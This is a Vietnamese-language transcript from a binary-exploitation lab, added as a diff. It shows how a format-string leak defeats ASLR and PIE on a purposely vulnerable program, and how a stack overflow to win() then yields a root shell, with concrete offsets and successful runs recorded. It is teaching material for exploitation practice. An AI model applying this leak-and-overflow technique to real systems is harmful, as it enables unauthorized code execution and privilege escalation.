@@ -1,0 +1,70 @@
+=====================================================================
+Lab 5.3 - transcript (output THAT, chay tren server verify)
+Moi truong: Ubuntu 24.04.4 LTS, glibc 2.39, gcc 13.3.0
+ASLR: randomize_va_space = 2 (BAT day du - base image doi moi lan chay)
+=====================================================================
+
+$ bash build.sh
+[*] built: lab (PIE, No canary, NX). Nho bat ASLR that khi chay.
+
+---------------------------------------------------------------------
+checksec / type
+---------------------------------------------------------------------
+$ pwn checksec lab
+    Arch:       amd64-64-little
+    RELRO:      Full RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        PIE enabled
+    Stripped:   No
+    Debuginfo:  Yes
+$ readelf -h lab | grep Type
+  Type:  DYN (Position-Independent Executable file)
+
+---------------------------------------------------------------------
+Offset (static, trong file PIE) va overflow offset
+---------------------------------------------------------------------
+$ nm lab | grep -E ' (win|main|vuln)$'
+    win  off = 0x1179
+    main off = 0x121d
+    vuln off = 0x119e
+# main: `call vuln` o 0x123f => lenh ke tiep (return-into-main) = 0x1244
+# vuln: sub $0x40 => buf = rbp-0x40, khong canary => offset toi saved RIP = 72
+# ret gadget (static) = 0x101a
+
+---------------------------------------------------------------------
+Tim format offset leak con tro .text: doi chieu %N$p voi /proc/<pid>/maps
+---------------------------------------------------------------------
+image base (maps) = 0x615eb3965000
+libc  base (maps) = 0x78a4b0600000
+%13$p = 0x78a4b09d4000
+%14$p = 0x7fffbfb26fe0
+%15$p = 0x615eb3966244   <= IMAGE + 0x1244     (return-into-main, con tro .text)
+%16$p = 0x7fffbfb27080
+%17$p = 0x78a4b062a1ca   <= LIBC  + 0x2a1ca    (con tro libc, de leak libc neu can)
+# => dung %15$p: base_image = leak - 0x1244.
+
+---------------------------------------------------------------------
+exploit.py: leak %15$p -> base = leak - 0x1244 -> overflow -> win() -> shell
+---------------------------------------------------------------------
+$ python3 exploit.py
+[+] Starting local process './lab': pid ...
+[+] leak        = 0x6165914f7244
+[+] image base  = 0x6165914f6000
+[*] win         = 0x6165914f7179
+[*] Loaded 5 cached gadgets for './lab'
+[*] Process './lab' stopped with exit code 0
+===SHELL_OK===
+uid=0(root) gid=0(root) groups=0(root)
+
+---------------------------------------------------------------------
+Chay 3 lan voi ASLR BAT: base khac nhau moi lan, deu can trang (...000)
+---------------------------------------------------------------------
+run 1: leak=0x6165914f7244  base=0x6165914f6000  -> ===SHELL_OK=== uid=0(root)
+run 2: leak=0x617ec3077244  base=0x617ec3076000  -> ===SHELL_OK=== uid=0(root)
+run 3: leak=0x62d5a8296244  base=0x62d5a8295000  -> ===SHELL_OK=== uid=0(root)
+# base & 0xfff == 0 o ca ba lan => tru dung offset.
+
+# KET QUA: binary PIE, ASLR bat. Leak 1 con tro .text qua format string, tinh
+# base = leak - 0x1244, roi overflow (offset 72) nhay win() = base + 0x1179 ->
+# shell root. 12 bit thap cua base luon la 000 (can trang) - dau hieu leak dung.
